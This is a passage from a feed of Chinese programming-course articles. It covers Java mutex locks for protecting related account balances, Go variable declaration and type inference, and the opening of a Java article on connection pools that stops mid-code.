&lt;p>相关的示例代码如下，账户类 Account 有两个成员变量，分别是账户余额 balance 和账户密码 password。取款 withdraw() 和查看余额 getBalance() 操作会访问账户余额 balance，我们创建一个 final 对象 balLock 作为锁（类比球赛门票）；而更改密码 updatePassword() 和查看密码 getPassword() 操作会修改账户密码 password，我们创建一个 final 对象 pwLock 作为锁（类比电影票）。不同的资源用不同的锁保护，各自管各自的，很简单。&lt;/p>
&lt;pre>&lt;code>class Account {
// 锁：保护账户余额
private final Object balLock
= new Object();
// 账户余额
private Integer balance;
// 锁：保护账户密码
private final Object pwLock
= new Object();
// 账户密码
private String password;
// 取款
void withdraw(Integer amt) {
synchronized(balLock) {
if (this.balance &amp;gt; amt){
this.balance -= amt;
}
}
}
// 查看余额
Integer getBalance() {
synchronized(balLock) {
return balance;
}
}
// 更改密码
void updatePassword(String pw){
synchronized(pwLock) {
this.password = pw;
}
}
// 查看密码
String getPassword() {
synchronized(pwLock) {
return password;
}
}
}
&lt;/code>&lt;/pre>
&lt;p>当然，我们也可以用一把互斥锁来保护多个资源，例如我们可以用 this 这一把锁来管理账户类里所有的资源：账户余额和用户密码。具体实现很简单，示例程序中所有的方法都增加同步关键字 synchronized 就可以了，这里我就不一一展示了。&lt;/p>
&lt;p>但是用一把锁有个问题，就是性能太差，会导致取款、查看余额、修改密码、查看密码这四个操作都是串行的。而我们用两把锁，取款和修改密码是可以并行的。&lt;strong>用不同的锁对受保护资源进行精细化管理，能够提升性能&lt;/strong> 。这种锁还有个名字，叫&lt;strong>细粒度锁&lt;/strong>。&lt;/p>
&lt;h2 id="保护有关联关系的多个资源">保护有关联关系的多个资源&lt;/h2>
&lt;p>如果多个资源是有关联关系的，那这个问题就有点复杂了。例如银行业务里面的转账操作，账户 A 减少 100 元，账户 B 增加 100 元。这两个账户就是有关联关系的。那对于像转账这种有关联关系的操作，我们应该怎么去解决呢？先把这个问题代码化。我们声明了个账户类：Account，该类有一个成员变量余额：balance，还有一个用于转账的方法：transfer()，然后怎么保证转账操作 transfer() 没有并发问题呢？&lt;/p>
&lt;pre>&lt;code>class Account {
private int balance;
// 转账
void transfer(
Account target, int amt){
if (this.balance &amp;gt; amt) {
this.balance -= amt;
target.balance += amt;
}
}
}
&lt;/code>&lt;/pre>
&lt;p>相信你的直觉会告诉你这样的解决方案：用户 synchronized 关键字修饰一下 transfer() 方法就可以了，于是你很快就完成了相关的代码，如下所示。&lt;/p>
&lt;pre>&lt;code>class Account {
private int balance;
// 转账
synchronized void transfer(
Account target, int amt){
if (this.balance &amp;gt; amt) {
this.balance -= amt;
target.balance += amt;
}
}
}
&lt;/code>&lt;/pre>
&lt;p>在这段代码中，临界区内有两个资源，分别是转出账户的余额 this.balance 和转入账户的余额 target.balance，并且用的是一把锁 this，符合我们前面提到的，多个资源可以用一把锁来保护，这看上去完全正确呀。真的是这样吗？可惜，这个方案仅仅是看似正确，为什么呢？&lt;/p>
&lt;p>问题就出在 this 这把锁上，this 这把锁可以保护自己的余额 this.balance，却保护不了别人的余额 target.balance，就像你不能用自家的锁来保护别人家的资产，也不能用自己的票来保护别人的座位一样。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/1b/d8/1ba92a09d1a55a6a1636318f30c155d8.png" alt="">
用锁 this 保护 this.balance 和 target.balance 的示意图&lt;/p>
&lt;p>下面我们具体分析一下，假设有 A、B、C 三个账户，余额都是 200 元，我们用两个线程分别执行两个转账操作：账户 A 转给账户 B 100 元，账户 B 转给账户 C 100 元，最后我们期望的结果应该是账户 A 的余额是 100 元，账户 B 的余额是 200 元， 账户 C 的余额是 300 元。&lt;/p>
&lt;p>我们假设线程 1 执行账户 A 转账户 B 的操作，线程 2 执行账户 B 转账户 C 的操作。这两个线程分别在两颗 CPU 上同时执行，那它们是互斥的吗？我们期望是，但实际上并不是。因为线程 1 锁定的是账户 A 的实例（A.this），而线程 2 锁定的是账户 B 的实例（B.this），所以这两个线程可以同时进入临界区 transfer()。同时进入临界区的结果是什么呢？线程 1 和线程 2 都会读到账户 B 的余额为 200，导致最终账户 B 的余额可能是 300（线程 1 后于线程 2 写 B.balance，线程 2 写的 B.balance 值被线程 1 覆盖），可能是 100（线程 1 先于线程 2 写 B.balance，线程 1 写的 B.balance 值被线程 2 覆盖），就是不可能是 200。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/a4/27/a46b4a1e73671d6e6f1bdb26f6c87627.png" alt="">
并发转账示意图&lt;/p>
&lt;h2 id="使用锁的正确姿势">使用锁的正确姿势&lt;/h2>
&lt;p>在上一篇文章中，我们提到用同一把锁来保护多个资源，也就是现实世界的&amp;quot;包场&amp;quot;，那在编程领域应该怎么&amp;quot;包场&amp;quot;呢？很简单，只要我们的&lt;strong>锁能覆盖所有受保护资源&lt;/strong>就可以了。在上面的例子中，this 是对象级别的锁，所以 A 对象和 B 对象都有自己的锁，如何让 A 对象和 B 对象共享一把锁呢？&lt;/p>
&lt;p>稍微开动脑筋，你会发现其实方案还挺多的，比如可以让所有对象都持有一个唯一性的对象，这个对象在创建 Account 时传入。方案有了，完成代码就简单了。示例代码如下，我们把 Account 默认构造函数变为 private，同时增加一个带 Object lock 参数的构造函数，创建 Account 对象时，传入相同的 lock，这样所有的 Account 对象都会共享这个 lock 了。&lt;/p>
&lt;pre>&lt;code>class Account {
private Object lock；
private int balance;
private Account();
// 创建 Account 时传入同一个 lock 对象
public Account(Object lock) {
this.lock = lock;
}
// 转账
void transfer(Account target, int amt){
// 此处检查所有对象共享的锁
synchronized(lock) {
if (this.balance &amp;gt; amt) {
this.balance -= amt;
target.balance += amt;
}
}
}
}
&lt;/code>&lt;/pre>
&lt;p>这个办法确实能解决问题，但是有点小瑕疵，它要求在创建 Account 对象的时候必须传入同一个对象，如果创建 Account 对象时，传入的 lock 不是同一个对象，那可就惨了，会出现锁自家门来保护他家资产的荒唐事。在真实的项目场景中，创建 Account 对象的代码很可能分散在多个工程中，传入共享的 lock 真的很难。&lt;/p>
&lt;p>所以，上面的方案缺乏实践的可行性，我们需要更好的方案。还真有，就是&lt;strong>用 Account.class 作为共享的锁&lt;/strong>。Account.class 是所有 Account 对象共享的，而且这个对象是 Java 虚拟机在加载 Account 类的时候创建的，所以我们不用担心它的唯一性。使用 Account.class 作为共享的锁，我们就无需在创建 Account 对象时传入了，代码更简单。&lt;/p>
&lt;pre>&lt;code>class Account {
private int balance;
// 转账
void transfer(Account target, int amt){
synchronized(Account.class) {
if (this.balance &amp;gt; amt) {
this.balance -= amt;
target.balance += amt;
}
}
}
}
&lt;/code>&lt;/pre>
&lt;p>下面这幅图很直观地展示了我们是如何使用共享的锁 Account.class 来保护不同对象的临界区的。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/52/7c/527cd65f747abac3f23390663748da7c.png" alt="">&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>相信你看完这篇文章后，对如何保护多个资源已经很有心得了，关键是要分析多个资源之间的关系。如果资源之间没有关系，很好处理，每个资源一把锁就可以了。如果资源之间有关联关系，就要选择一个粒度更大的锁，这个锁应该能够覆盖所有相关的资源。除此之外，还要梳理出有哪些访问路径，所有的访问路径都要设置合适的锁，这个过程可以类比一下门票管理。&lt;/p>
&lt;p>我们再引申一下上面提到的关联关系，关联关系如果用更具体、更专业的语言来描述的话，其实是一种&amp;quot;原子性&amp;quot;特征，在前面的文章中，我们提到的原子性，主要是面向 CPU 指令的，转账操作的原子性则是属于是面向高级语言的，不过它们本质上是一样的。&lt;/p>
&lt;p>&lt;strong>&amp;ldquo;原子性&amp;quot;的本质&lt;/strong> 是什么？其实不是不可分割，不可分割只是外在表现，其本质是多个资源间有一致性的要求，&lt;strong>操作的中间状态对外不可见&lt;/strong> 。例如，在 32 位的机器上写 long 型变量有中间状态（只写了 64 位中的 32 位），在银行转账的操作中也有中间状态（账户 A 减少了 100，账户 B 还没来得及发生变化）。所以&lt;strong>解决原子性问题，是要保证中间状态对外不可见&lt;/strong>。&lt;/p>
&lt;h2 id="课后思考">课后思考&lt;/h2>
&lt;p>在第一个示例程序里，我们用了两把不同的锁来分别保护账户余额、账户密码，创建锁的时候，我们用的是：&lt;code>private final Object xxxLock = new Object();&lt;/code>，如果账户余额用 this.balance 作为互斥锁，账户密码用 this.password 作为互斥锁，你觉得是否可以呢？&lt;/p>
&lt;p>欢迎在留言区与我分享你的想法，也欢迎你在留言区记录你的思考过程。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/cf/aa/cf393cd748a4f0e6451807c4b61843aa.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 04丨程序实体的那些事儿（上）</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/04%E4%B8%A8%E7%A8%8B%E5%BA%8F%E5%AE%9E%E4%BD%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%E4%B8%8A/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/04%E4%B8%A8%E7%A8%8B%E5%BA%8F%E5%AE%9E%E4%BD%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%E4%B8%8A/</guid><description>
&lt;p>我已经为你打开了 Go 语言编程之门，并向你展示了&amp;quot;程序从初建到拆分，再到模块化&amp;quot;的基本演化路径。&lt;/p>
&lt;p>一个编程老手让程序完成基本演化，可能也就需要几十分钟甚至十几分钟，因为他们一开始就会把车开到模块化编程的道路上。我相信，等你真正理解了这个过程之后，也会驾轻就熟的。&lt;/p>
&lt;p>上述套路是通用的，不是只适用于 Go 语言。但从本篇开始，我会开始向你介绍 Go 语言中的各种特性以及相应的编程方法和思想。&lt;/p>
&lt;hr>
&lt;p>我在讲解那两种源码文件基本编写方法的时候，声明和使用了一些程序实体。你也许已经若有所觉，也许还在云里雾里。没关系，我现在就与你一起梳理这方面的重点。&lt;/p>
&lt;p>还记得吗？&lt;strong>Go 语言中的程序实体包括变量、常量、函数、结构体和接口。&lt;/strong> Go 语言是静态类型的编程语言，所以我们在声明变量或常量的时候，都需要指定它们的类型，或者给予足够的信息，这样才可以让 Go 语言能够推导出它们的类型。&lt;/p>
&lt;blockquote>
&lt;p>在 Go 语言中，变量的类型可以是其预定义的那些类型，也可以是程序自定义的函数、结构体或接口。常量的合法类型不多，只能是那些 Go 语言预定义的基本类型。它的声明方式也更简单一些。&lt;/p>
&lt;/blockquote>
&lt;p>好了，下面这个简单的问题你需要了解一下。&lt;/p>
&lt;h2 id="问题声明变量有几种方式">&lt;strong>问题：声明变量有几种方式？&lt;/strong>&lt;/h2>
&lt;p>先看段代码。&lt;/p>
&lt;pre>&lt;code>package main
import (
&amp;quot;flag&amp;quot;
&amp;quot;fmt&amp;quot;
)
func main() {
var name string // [1]
flag.StringVar(&amp;amp;name, &amp;quot;name&amp;quot;, &amp;quot;everyone&amp;quot;, &amp;quot;The greeting object.&amp;quot;) // [2]
flag.Parse()
fmt.Printf(&amp;quot;Hello, %v!\n&amp;quot;, name)
}
&lt;/code>&lt;/pre>
&lt;p>这是一个很简单的命令源码文件，我把它命名为 demo7.go。它是 demo2.go 的微调版。我只是把变量&lt;code>name&lt;/code>的声明和对&lt;code>flag.StringVar&lt;/code>函数的调用，都移动到了&lt;code>main&lt;/code>函数中，这分别对应代码中的注释&lt;code>[1]&lt;/code>和&lt;code>[2]&lt;/code>。&lt;/p>
&lt;p>具体的问题是，除了&lt;code>var name string&lt;/code>这种声明变量&lt;code>name&lt;/code>的方式，还有其他方式吗？你可以选择性地改动注释&lt;code>[1]&lt;/code>和&lt;code>[2]&lt;/code>处的代码。&lt;/p>
&lt;h2 id="典型回答">&lt;strong>典型回答&lt;/strong>&lt;/h2>
&lt;p>这有几种做法，我在这里只说最典型的两种。&lt;/p>
&lt;p>&lt;strong>第一种方式&lt;/strong> 需要先对注释&lt;code>[2]&lt;/code>处的代码稍作改动，把被调用的函数由&lt;code>flag.StringVar&lt;/code>改为&lt;code>flag.String&lt;/code>，传参的列表也需要随之修改，这是为了&lt;code>[1]&lt;/code>和&lt;code>[2]&lt;/code>处代码合并的准备工作。&lt;/p>
&lt;pre>&lt;code>var name = flag.String(&amp;quot;name&amp;quot;, &amp;quot;everyone&amp;quot;, &amp;quot;The greeting object.&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>合并后的代码看起来更简洁一些。我把注释&lt;code>[1]&lt;/code>处的代码中的&lt;code>string&lt;/code>去掉了，右边添加了一个&lt;code>=&lt;/code>，然后再拼接上经过修改的&lt;code>[2]&lt;/code>处代码。&lt;/p>
&lt;p>注意，&lt;code>flag.String&lt;/code>函数返回的结果值的类型是&lt;code>*string&lt;/code>而不是&lt;code>string&lt;/code>。类型&lt;code>*string&lt;/code>代表的是字符串的指针类型，而不是字符串类型。因此，这里的变量&lt;code>name&lt;/code>代表的是一个指向字符串值的指针。&lt;/p>
&lt;p>关于 Go 语言中的指针，我在后面会有专门的介绍。你在这里只需要知道，我们可以通过操作符&lt;code>*&lt;/code>把这个指针指向的字符串值取出来了。因此，在这种情况下，那个被用来打印内容的函数调用就需要微调一下，把其中的参数&lt;code>name&lt;/code>改为&lt;code>*name&lt;/code>，即：&lt;code>fmt.Printf(&amp;quot;Hello, %v!\n&amp;quot;, *name)&lt;/code>。&lt;/p>
&lt;p>好了，我想你已经基本理解了这行代码中的每一个部分。&lt;/p>
&lt;p>&lt;strong>下面我接着说第二种方式。&lt;/strong> 第二种方式与第一种方式非常类似，它基于第一种方式的代码，赋值符号&lt;code>=&lt;/code>右边的代码不动，左边只留下&lt;code>name&lt;/code>，再把&lt;code>=&lt;/code>变成&lt;code>:=&lt;/code>。&lt;/p>
&lt;pre>&lt;code>name := flag.String(&amp;quot;name&amp;quot;, &amp;quot;everyone&amp;quot;, &amp;quot;The greeting object.&amp;quot;)
&lt;/code>&lt;/pre>
&lt;h2 id="问题解析">&lt;strong>问题解析&lt;/strong>&lt;/h2>
&lt;p>这个问题的基本考点有两个。&lt;strong>一个是你要知道 Go 语言中的类型推断，以及它在代码中的基本体现，另一个是短变量声明的用法。&lt;/strong>&lt;/p>
&lt;p>第一种方式中的代码在声明变量&lt;code>name&lt;/code>的同时，还为它赋了值，而这时声明中并没有显式指定&lt;code>name&lt;/code>的类型。&lt;/p>
&lt;p>还记得吗？之前的变量声明语句是&lt;code>var name string&lt;/code>。这里利用了 Go 语言自身的类型推断，而省去了对该变量的类型的声明。&lt;/p>
&lt;blockquote>
&lt;p>简单地说，类型推断是一种编程语言在编译期自动解释表达式类型的能力。什么是表达式？详细的解释你可以参看 Go 语言规范中的&lt;a href="https://golang.google.cn/ref/spec#Expressions">表达式&lt;/a>和&lt;a href="https://golang.google.cn/ref/spec#Expression_statements">表达式语句&lt;/a>章节。我在这里就不赘述了。&lt;/p>
&lt;/blockquote>
&lt;p>你可以认为，表达式类型就是对表达式进行求值后得到结果的类型。Go 语言中的类型推断是很简约的，这也是 Go 语言整体的风格。&lt;/p>
&lt;p>它只能用于对变量或常量的初始化，就像上述回答中描述的那样。对&lt;code>flag.String&lt;/code>函数的调用其实就是一个调用表达式，而这个表达式的类型是&lt;code>*string&lt;/code>，即字符串的指针类型。&lt;/p>
&lt;p>这也是调用&lt;code>flag.String&lt;/code>函数后得到结果的类型。随后，Go 语言把这个调用了&lt;code>flag.String&lt;/code>函数的表达式类型，直接作为了变量&lt;code>name&lt;/code>的类型，这就是&amp;quot;推断&amp;quot;一词所指代的操作了。&lt;/p>
&lt;p>至于第二种方式所用的短变量声明，实际上就是 Go 语言的类型推断再加上一点点语法糖。&lt;/p>
&lt;p>我们只能在函数体内部使用短变量声明。在编写&lt;code>if&lt;/code>、&lt;code>for&lt;/code>或&lt;code>switch&lt;/code>语句的时候，我们经常把它安插在初始化子句中，并用来声明一些临时的变量。而相比之下，第一种方式更加通用，它可以被用在任何地方。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/b7/bc/b7d73fdce13a3a5f2d56d0b95f2c8cbc.png" alt="">&lt;/p>
&lt;p>（变量的多种声明方式）&lt;/p>
&lt;p>短变量声明还有其他的玩法，我稍后就会讲到。&lt;/p>
&lt;h2 id="知识扩展">&lt;strong>知识扩展&lt;/strong>&lt;/h2>
&lt;h3 id="1-go-语言的类型推断可以带来哪些好处">&lt;strong>1. Go 语言的类型推断可以带来哪些好处？&lt;/strong>&lt;/h3>
&lt;p>如果面试官问你这个问题，你应该怎样回答？&lt;/p>
&lt;p>当然，在写代码时，我们通过使用 Go 语言的类型推断，而节省下来的键盘敲击次数几乎可以忽略不计。但它真正的好处，往往会体现在我们写代码之后的那些事情上，比如代码重构。&lt;/p>
&lt;p>为了更好的演示，我们先要做一点准备工作。我们依然通过调用一个函数在声明&lt;code>name&lt;/code>变量的同时为它赋值，但是这个函数不是&lt;code>flag.String&lt;/code>，而是由我们自己定义的某个函数，比如叫&lt;code>getTheFlag&lt;/code>。&lt;/p>
&lt;pre>&lt;code>package main
import (
&amp;quot;flag&amp;quot;
&amp;quot;fmt&amp;quot;
)
func main() {
var name = getTheFlag()
flag.Parse()
fmt.Printf(&amp;quot;Hello, %v!\n&amp;quot;, *name)
}
func getTheFlag() *string {
return flag.String(&amp;quot;name&amp;quot;, &amp;quot;everyone&amp;quot;, &amp;quot;The greeting object.&amp;quot;)
}
&lt;/code>&lt;/pre>
&lt;p>我们可以用&lt;code>getTheFlag&lt;/code>函数包裹（或者说包装）那个对&lt;code>flag.String&lt;/code>函数的调用，并把其结果直接作为&lt;code>getTheFlag&lt;/code>函数的结果，结果的类型是&lt;code>*string&lt;/code>。&lt;/p>
&lt;p>这样一来，&lt;code>var name =&lt;/code>右边的表达式，可以变为针对&lt;code>getTheFlag&lt;/code>函数的调用表达式了。这实际上是对&amp;quot;声明并赋值&lt;code>name&lt;/code>变量的那行代码&amp;quot;的重构。&lt;/p>
&lt;blockquote>
&lt;p>我们通常把不改变某个程序与外界的任何交互方式和规则，而只改变其内部实现&amp;quot;的代码修改方式，叫做对该程序的重构。重构的对象可以是一行代码、一个函数、一个功能模块，甚至一个软件系统。&lt;/p>
&lt;/blockquote>
&lt;p>好了，在准备工作做完之后，你会发现，你可以随意改变&lt;code>getTheFlag&lt;/code>函数的内部实现，及其返回结果的类型，而不用修改&lt;code>main&lt;/code>函数中的任何代码。&lt;/p>
&lt;p>这个命令源码文件依然可以通过编译，并且构建和运行也都不会有问题。也许你能感觉得到，这是一个关于程序灵活性的质变。&lt;/p>
&lt;p>我们不显式地指定变量&lt;code>name&lt;/code>的类型，使得它可以被赋予任何类型的值。也就是说，变量&lt;code>name&lt;/code>的类型可以在其初始化时，由其他程序动态地确定。&lt;/p>
&lt;p>在你改变&lt;code>getTheFlag&lt;/code>函数的结果类型之后，Go 语言的编译器会在你再次构建该程序的时候，自动地更新变量&lt;code>name&lt;/code>的类型。如果你使用过&lt;code>Python&lt;/code>或&lt;code>Ruby&lt;/code>这种动态类型的编程语言的话，一定会觉得这情景似曾相识。&lt;/p>
&lt;p>没错，通过这种类型推断，你可以体验到动态类型编程语言所带来的一部分优势，即程序灵活性的明显提升。但在那些编程语言中，这种提升可以说是用程序的可维护性和运行效率换来的。&lt;/p>
&lt;p>Go 语言是静态类型的，所以一旦在初始化变量时确定了它的类型，之后就不可能再改变。这就避免了在后面维护程序时的一些问题。另外，请记住，这种类型的确定是在编译期完成的，因此不会对程序的运行效率产生任何影响。&lt;/p>
&lt;p>现在，你应该已经对这个问题有一个比较深刻的理解了。&lt;/p>
&lt;p>如果只用一两句话回答这个问题的话，我想可以是这样的：Go 语言的类型推断可以明显提升程序的灵活性，使得代码重构变得更加容易，同时又不会给代码的维护带来额外负担（实际上，它恰恰可以避免散弹式的代码修改），更不会损失程序的运行效率。&lt;/p>
&lt;h3 id="2-变量的重声明是什么意思">&lt;strong>2. 变量的重声明是什么意思？&lt;/strong>&lt;/h3>
&lt;p>这涉及了短变量声明。通过使用它，我们可以对同一个代码块中的变量进行重声明。&lt;/p>
&lt;blockquote>
&lt;p>既然说到了代码块，我先来解释一下它。在 Go 语言中，代码块一般就是一个由花括号括起来的区域，里面可以包含表达式和语句。Go 语言本身以及我们编写的代码共同形成了一个非常大的代码块，也叫全域代码块。&lt;/p>
&lt;p>这主要体现在，只要是公开的全局变量，都可以被任何代码所使用。相对小一些的代码块是代码包，一个代码包可以包含许多子代码包，所以这样的代码块也可以很大。&lt;/p>
&lt;p>接下来，每个源码文件也都是一个代码块，每个函数也是一个代码块，每个&lt;code>if&lt;/code>语句、&lt;code>for&lt;/code>语句、&lt;code>switch&lt;/code>语句和&lt;code>select&lt;/code>语句都是一个代码块。甚至，&lt;code>switch&lt;/code>或&lt;code>select&lt;/code>语句中的&lt;code>case&lt;/code>子句也都是独立的代码块。&lt;/p>
&lt;p>走个极端，我就在&lt;code>main&lt;/code>函数中写一对紧挨着的花括号算不算一个代码块？当然也算，这甚至还有个名词，叫&amp;quot;空代码块&amp;quot;。&lt;/p>
&lt;/blockquote>
&lt;p>回到变量重声明的问题上。其含义是对已经声明过的变量再次声明。变量重声明的前提条件如下。&lt;/p>
&lt;ol>
&lt;li>由于变量的类型在其初始化时就已经确定了，所以对它再次声明时赋予的类型必须与其原本的类型相同，否则会产生编译错误。&lt;/li>
&lt;li>变量的重声明只可能发生在某一个代码块中。如果与当前的变量重名的是外层代码块中的变量，那么就是另外一种含义了，我在下一篇文章中会讲到。&lt;/li>
&lt;li>变量的重声明只有在使用短变量声明时才会发生，否则也无法通过编译。如果要在此处声明全新的变量，那么就应该使用包含关键字&lt;code>var&lt;/code>的声明语句，但是这时就不能与同一个代码块中的任何变量有重名了。&lt;/li>
&lt;li>被&amp;quot;声明并赋值&amp;quot;的变量必须是多个，并且其中至少有一个是新的变量。这时我们才可以说对其中的旧变量进行了重声明。&lt;/li>
&lt;/ol>
&lt;p>这样来看，变量重声明其实算是一个语法糖（或者叫便利措施）。它允许我们在使用短变量声明时不用理会被赋值的多个变量中是否包含旧变量。可以想象，如果不这样会多写不少代码。&lt;/p>
&lt;p>我把一个简单的例子写在了&amp;quot;Golang_Puzzlers&amp;quot;项目的&lt;code>puzzlers/article4/q3&lt;/code>包中的 demo9.go 文件中，你可以去看一下。&lt;/p>
&lt;p>这其中最重要的两行代码如下：&lt;/p>
&lt;pre>&lt;code>var err error
n, err := io.WriteString(os.Stdout, &amp;quot;Hello, everyone!\n&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>我使用短变量声明对新变量&lt;code>n&lt;/code>和旧变量&lt;code>err&lt;/code>进行了&amp;quot;声明并赋值&amp;quot;，这时也是对后者的重声明。&lt;/p>
&lt;h2 id="总结">&lt;strong>总结&lt;/strong>&lt;/h2>
&lt;p>在本篇中，我们聚焦于最基本的 Go 语言程序实体：变量。并详细解说了变量声明和赋值的基本方法，及其背后的重要概念和知识。我们使用关键字&lt;code>var&lt;/code>和短变量声明，都可以实现对变量的&amp;quot;声明并赋值&amp;quot;。&lt;/p>
&lt;p>这两种方式各有千秋，有着各自的特点和适用场景。前者可以被用在任何地方，而后者只能被用在函数或者其他更小的代码块中。&lt;/p>
&lt;p>不过，通过前者我们无法对已有的变量进行重声明，也就是说它无法处理新旧变量混在一起的情况。不过它们也有一个很重要的共同点，即：基于类型推断，Go 语言的类型推断只应用在了对变量或常量的初始化方面。&lt;/p>
&lt;h2 id="思考题">&lt;strong>思考题&lt;/strong>&lt;/h2>
&lt;p>本次的思考题只有一个：如果与当前的变量重名的是外层代码块中的变量，那么这意味着什么？&lt;/p>
&lt;p>这道题对于你来说可能有些难，不过我鼓励你多做几次试验试试，你可以在代码中多写一些打印语句，然后运行它，并记录下每次试验的结果。如果有疑问也一定要写下来，答案将在下篇文章中揭晓。&lt;/p>
&lt;p>&lt;a href="https://github.com/hyper0x/Golang_Puzzlers">戳此查看 Go 语言专栏文章配套详细代码。&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/35/48/358e4e8578a706598e18a7dfed3ed648.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 04丨连接池：别让连接池帮了倒忙</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E4%B8%9A%E5%8A%A1%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF100%E4%BE%8B/04%E4%B8%A8%E8%BF%9E%E6%8E%A5%E6%B1%A0%E5%88%AB%E8%AE%A9%E8%BF%9E%E6%8E%A5%E6%B1%A0%E5%B8%AE%E4%BA%86%E5%80%92%E5%BF%99/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E4%B8%9A%E5%8A%A1%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF100%E4%BE%8B/04%E4%B8%A8%E8%BF%9E%E6%8E%A5%E6%B1%A0%E5%88%AB%E8%AE%A9%E8%BF%9E%E6%8E%A5%E6%B1%A0%E5%B8%AE%E4%BA%86%E5%80%92%E5%BF%99/</guid><description>
&lt;p>你好，我是朱晔。今天，我们来聊聊使用连接池需要注意的问题。&lt;/p>
&lt;p>在上一讲，我们学习了使用线程池需要注意的问题。今天，我再与你说说另一种很重要的池化技术，即连接池。&lt;/p>
&lt;p>我先和你说说连接池的结构。连接池一般对外提供获得连接、归还连接的接口给客户端使用，并暴露最小空闲连接数、最大连接数等可配置参数，在内部则实现连接建立、连接心跳保持、连接管理、空闲连接回收、连接可用性检测等功能。连接池的结构示意图，如下所示：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/16/7e/1685d9db2602e1de8483de171af6fd7e.png" alt="">&lt;/p>
&lt;p>业务项目中经常会用到的连接池，主要是数据库连接池、Redis 连接池和 HTTP 连接池。所以，今天我就以这三种连接池为例，和你聊聊使用和配置连接池容易出错的地方。&lt;/p>
&lt;h1 id="注意鉴别客户端-sdk-是否基于连接池">注意鉴别客户端 SDK 是否基于连接池&lt;/h1>
&lt;p>在使用三方客户端进行网络通信时，我们首先要确定客户端 SDK 是否是基于连接池技术实现的。我们知道，TCP 是面向连接的基于字节流的协议：&lt;/p>
&lt;ul>
&lt;li>面向连接，意味着连接需要先创建再使用，创建连接的三次握手有一定开销；&lt;/li>
&lt;li>基于字节流，意味着字节是发送数据的最小单元，TCP 协议本身无法区分哪几个字节是完整的消息体，也无法感知是否有多个客户端在使用同一个 TCP 连接，TCP 只是一个读写数据的管道。&lt;/li>
&lt;/ul>
&lt;p>如果客户端 SDK 没有使用连接池，而直接是 TCP 连接，那么就需要考虑每次建立 TCP 连接的开销，&lt;strong>并且因为 TCP 基于字节流，在多线程的情况下对同一连接进行复用，可能会产生线程安全问题&lt;/strong>。&lt;/p>
&lt;p>我们先看一下涉及 TCP 连接的客户端 SDK，对外提供 API 的三种方式。在面对各种三方客户端的时候，只有先识别出其属于哪一种，才能理清楚使用方式。&lt;/p>
&lt;ul>
&lt;li>连接池和连接分离的 API：有一个 XXXPool 类负责连接池实现，先从其获得连接 XXXConnection，然后用获得的连接进行服务端请求，完成后使用者需要归还连接。通常，XXXPool 是线程安全的，可以并发获取和归还连接，而 XXXConnection 是非线程安全的。对应到连接池的结构示意图中，XXXPool 就是右边连接池那个框，左边的客户端是我们自己的代码。&lt;/li>
&lt;li>内部带有连接池的 API：对外提供一个 XXXClient 类，通过这个类可以直接进行服务端请求；这个类内部维护了连接池，SDK 使用者无需考虑连接的获取和归还问题。一般而言，XXXClient 是线程安全的。对应到连接池的结构示意图中，整个 API 就是蓝色框包裹的部分。&lt;/li>
&lt;li>非连接池的 API：一般命名为 XXXConnection，以区分其是基于连接池还是单连接的，而不建议命名为 XXXClient 或直接是 XXX。直接连接方式的 API 基于单一连接，每次使用都需要创建和断开连接，性能一般，且通常不是线程安全的。对应到连接池的结构示意图中，这种形式相当于没有右边连接池那个框，客户端直接连接服务端创建连接。&lt;/li>
&lt;/ul>
&lt;p>虽然上面提到了 SDK 一般的命名习惯，但不排除有一些客户端特立独行，因此在使用三方 SDK 时，一定要先查看官方文档了解其最佳实践，或是在类似 Stackoverflow 的网站搜索 XXX threadsafe/singleton 字样看看大家的回复，也可以一层一层往下看源码，直到定位到原始 Socket 来判断 Socket 和客户端 API 的对应关系。&lt;/p>
&lt;p>明确了 SDK 连接池的实现方式后，我们就大概知道了使用 SDK 的最佳实践：&lt;/p>
&lt;ul>
&lt;li>如果是分离方式，那么连接池本身一般是线程安全的，可以复用。每次使用需要从连接池获取连接，使用后归还，归还的工作由使用者负责。&lt;/li>
&lt;li>如果是内置连接池，SDK 会负责连接的获取和归还，使用的时候直接复用客户端。&lt;/li>
&lt;li>如果 SDK 没有实现连接池（大多数中间件、数据库的客户端 SDK 都会支持连接池），那通常不是线程安全的，而且短连接的方式性能不会很高，使用的时候需要考虑是否自己封装一个连接池。&lt;/li>
&lt;/ul>
&lt;p>接下来，我就以 Java 中用于操作 Redis 最常见的库 Jedis 为例，从源码角度分析下 Jedis 类到底属于哪种类型的 API，直接在多线程环境下复用一个连接会产生什么问题，以及如何用最佳实践来修复这个问题。&lt;/p>
&lt;p>首先，向 Redis 初始化 2 组数据，Key=a、Value=1，Key=b、Value=2：&lt;/p>
&lt;pre tabindex="0">&lt;code>@PostConstruct
public void init() {
